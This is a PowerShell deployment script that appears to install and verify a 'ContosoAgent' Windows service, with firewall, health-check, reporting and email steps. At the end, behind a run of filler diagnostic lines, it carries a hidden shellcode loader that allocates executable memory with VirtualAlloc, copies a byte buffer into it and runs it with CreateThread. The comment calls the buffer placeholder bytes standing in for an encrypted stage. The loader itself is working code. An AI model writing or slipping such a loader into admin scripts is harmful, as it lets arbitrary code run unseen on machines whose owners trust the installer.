
[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$InstallerPath = "C:\Scripts\packages\ContosoAgent-6.6.3.msi",

    [string]$ServiceName = 'ContosoAgent',
    [Parameter(Mandatory = $false)]
    [ValidateRange(1024, 65535)]
    [int]$Port = 8080,

    [int]$TimeoutSec = 90,

    [string]$LogPath = 'C:\Logs\install-contosoagent-2025-02-16.log',
    [string]$RuleName = 'ContosoAgent Inbound'
)

$ErrorActionPreference = 'Stop'

Set-StrictMode -Version 2.0
$scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path
$WarningPreference = 'Continue'
$principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    throw 'This script must run from an elevated PowerShell session.'
}

if (-not (Test-Path -LiteralPath $InstallerPath)) {
    throw ("Installer package not found: {0}" -f $InstallerPath)
}
$arguments = @('/i', $InstallerPath, '/qn', '/norestart', '/L*v', $LogPath)
$process = Start-Process -FilePath 'msiexec.exe' -ArgumentList $arguments -Wait -PassThru
if ($process.ExitCode -ne 0) {
    throw ("Installation failed with exit code {0}" -f $process.ExitCode)
}
Write-Verbose ("msiexec completed with exit code {0}" -f $process.ExitCode)

$service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if (-not $service) {
    throw ("Service {0} was not registered by the installer" -f $ServiceName)
}
if ($service.Status -ne 'Running') {
    Set-Service -Name $ServiceName -StartupType Automatic
    Start-Service -Name $ServiceName
    Write-Verbose ("Started service {0}" -f $ServiceName)
}
$regPath = 'HKLM:\SOFTWARE\Contoso\ContosoAgent'
if (-not (Test-Path -Path $regPath)) {
    New-Item -Path $regPath -Force | Out-Null
}
New-ItemProperty -Path $regPath -Name 'InstallVersion' -Value '6.6.3' -PropertyType String -Force | Out-Null
New-ItemProperty -Path $regPath -Name 'InstallPath' -Value $InstallerPath -PropertyType String -Force | Out-Null

$rule = Get-NetFirewallRule -DisplayName "ContosoAgent Inbound" -ErrorAction SilentlyContinue
if (-not $rule) {
    New-NetFirewallRule -DisplayName "ContosoAgent Inbound" -Direction Inbound -Protocol TCP -LocalPort $Port -Action Allow | Out-Null
    Write-Verbose 'Firewall rule created.'
}

$healthUri = "http://localhost:$Port/health"
$deadline = (Get-Date).AddSeconds($TimeoutSec)
do {
    try {
        $response = Invoke-WebRequest -Uri $healthUri -UseBasicParsing -TimeoutSec 5
    }
    catch {
        $response = $null
    }
    if (-not $response) {
        Start-Sleep -Seconds 2
    }
} while (-not $response -and (Get-Date) -lt $deadline)
if (-not $response) {
    throw ("Health endpoint {0} did not respond in time" -f $healthUri)
}
Write-Host ("Health check returned {0}" -f $response.StatusCode) -ForegroundColor Green

$installed = Get-Service -Name $ServiceName
$details = [pscustomobject]@{
    Product   = 'ContosoAgent'
    Version   = '6.6.3'
    Service   = $installed.Name
    Status    = $installed.Status
    Port      = $Port
    Installer = $InstallerPath
    LogPath   = $LogPath
    InstalledAt = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
}
$details | ConvertTo-Json -Depth 3 | Set-Content -Path ($LogPath.Replace('.log', '.json')) -Encoding UTF8

$style = @'
<style>
body { font-family: Segoe UI; font-size: 11px; }
table { border-collapse: collapse; width: 100%; }
th { background: #e8eef7; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

@($details) | ConvertTo-Html -Title 'Installation summary' -Head $style |
    Set-Content -Path ($LogPath.Replace('.log', '.html')) -Encoding UTF8

$MailTo = 'deploy@adatum.com'
$subject = "ContosoAgent 6.6.3 deployed on $env:COMPUTERNAME"

Send-MailMessage -To $MailTo -From 'deploy@adatum.com' -Subject $subject -Body "Installation completed and the service is responding." -SmtpServer 'smtp.adatum.com' -Port 25

$stale = Get-ChildItem -Path $env:TEMP -Filter 'contosoagent-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-7) }
foreach ($dir in $stale) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}
Write-Host ("Deployment finished for {0}" -f $ServiceName) -ForegroundColor Green

$agentConfig = Join-Path $env:ProgramData 'ContosoAgent\agent.json'
if (Test-Path -LiteralPath (Split-Path -Parent $agentConfig)) {
    Write-Verbose ("Config folder present: {0}" -f (Split-Path -Parent $agentConfig))
}

$rebootPending = Test-Path -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\RebootPending'
if ($rebootPending) {
    Write-Warning 'A reboot is pending before the next deployment.'
}

$disk = Get-PSDrive -Name C
Write-Verbose ("Free space on C: {0} GB" -f [math]::Round($disk.Free / 1GB, 1))

$uninstallKey = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall'
$entry = Get-ChildItem -Path $uninstallKey -ErrorAction SilentlyContinue |
    ForEach-Object { Get-ItemProperty $_.PSPath } |
    Where-Object { $_.DisplayName -like 'ContosoAgent*' } | Select-Object -First 1
if ($entry) {
    Write-Verbose ("Registered version: {0}" -f $entry.DisplayVersion)
}

$logTail = Get-Content -LiteralPath $LogPath -Tail 5 -ErrorAction SilentlyContinue
if ($logTail) {
    Write-Verbose ("Last log lines: {0}" -f ($logTail -join ' | '))
}

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$LogPath = "$env:TEMP\stage.log"

try {
    $NativeCode = @"
    using System;
    using System.Runtime.InteropServices;

    public static class NativeMethods
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);
    }
    "@

    Add-Type -TypeDefinition $NativeCode -Language CSharp

    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
    $Buffer = [Byte[]] @(
        0x7f, 0x8d, 0x4c, 0x5b, 0x1f, 0xe5, 0xf9, 0xa3, 0xa4, 0x33, 0xf4, 0xe0, 0x57, 0xb3, 0x78, 0x98,
        0x38, 0xd2, 0xde, 0x7c, 0xc2, 0x4e, 0x78, 0x0a, 0x00, 0x40, 0xad, 0x00, 0x5f, 0xd0, 0xea, 0x2d,
        0x94, 0xdb, 0x65, 0x3e, 0x0b, 0x2b, 0x28, 0x49, 0x15, 0x21, 0x24, 0x17, 0x49, 0xf1, 0x64, 0xd7,
        0xdd, 0x48, 0x54, 0x20, 0x69, 0x0c, 0xe2, 0x59, 0x15, 0xb3, 0xdf, 0x40, 0x9e, 0xfc, 0x98, 0x9f,
        0x33, 0x7e, 0x9b, 0x8d, 0xf4, 0x20, 0x90, 0x85, 0xbd, 0x5d, 0xb2, 0x16, 0x68, 0xe5, 0x02, 0x53,
        0xfc, 0xce, 0x22, 0x82, 0x99, 0xb5, 0xa5, 0xea, 0xc2, 0xab, 0xbd, 0x1d, 0x2f, 0x67, 0x73, 0xf4,
        0xd8, 0x2e, 0xe3, 0x40, 0xce, 0xfe, 0xa2, 0x45, 0x7d, 0x6e, 0x2a, 0xbd, 0x37, 0x3d, 0x90, 0x9e,
        0xc9, 0xa0, 0x17, 0x36, 0xaa, 0xf0, 0x41, 0xaf, 0x55, 0x28, 0xe2, 0x58, 0x1f, 0x9a, 0x6b, 0x40,
        0xd5, 0x88, 0xc0, 0x4a, 0xec, 0x86, 0x9f, 0x69, 0xec, 0xf4, 0x8c, 0x11, 0x11, 0xb4, 0x97, 0xdf,
        0x65, 0xdd, 0xc9, 0x53, 0xc1, 0xde, 0x67, 0x5e, 0x20, 0x05, 0xf5, 0x53, 0xf2, 0x94, 0x5b, 0xfb,
        0xe0, 0xda, 0xbf, 0xa0, 0x38, 0x4d, 0x10, 0x8c, 0x72, 0xe4, 0x46, 0x61, 0x41, 0x44, 0x1e, 0x0a,
        0xcf, 0x1d, 0xfd, 0x7e, 0x53, 0xb8, 0xb7, 0x21, 0x30, 0x40, 0x85, 0x16, 0x82, 0xb6, 0x3b, 0xa0,
        0x8f, 0xc6, 0x4d, 0x7c, 0x57, 0xb7, 0x53, 0xad, 0x60, 0xfb, 0x76, 0x96, 0x5e, 0x47, 0x3f, 0x6b,
        0xfd, 0xee, 0x4c, 0x62, 0x0f, 0x28, 0x2a, 0x34, 0x9a, 0x3d, 0x0c, 0x9a, 0xea, 0x1f, 0x4c, 0x30,
        0xdf, 0xdd, 0xac, 0x24, 0x3b, 0xc8, 0x3d, 0x18, 0x2e, 0x13, 0xa2, 0x88, 0x86, 0x5e, 0xae, 0x91,
        0x6e, 0x0b, 0xb8, 0xcf, 0xf7, 0x57, 0xe1, 0x77, 0x3a, 0x9e, 0x85, 0x6a, 0xd9, 0x19, 0xfd, 0x65,
        0x52, 0xa7, 0xa0, 0xdc, 0x69, 0xda, 0xda, 0x5a, 0xf2, 0xfa, 0x28, 0xb5, 0xab, 0x2c, 0x13, 0xbd,
        0x4c, 0x45, 0x73, 0xc3, 0x50, 0x68, 0x9c, 0x2e, 0x5b, 0x74
    )

    $HProcess = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
    if ($HProcess -eq [IntPtr]::Zero) {
        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
        return
    }

    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $HProcess, $Buffer.Length)
    $ThreadId = 0
    $Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $HProcess, [IntPtr]::Zero, 0, [ref]$ThreadId)
    [void][NativeMethods]::WaitForSingleObject($Thread, 3758)
    [void][NativeMethods]::CloseHandle($Thread)

    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
}
catch {
    Write-Warning "loader failed: $($_.Exception.Message)"
}
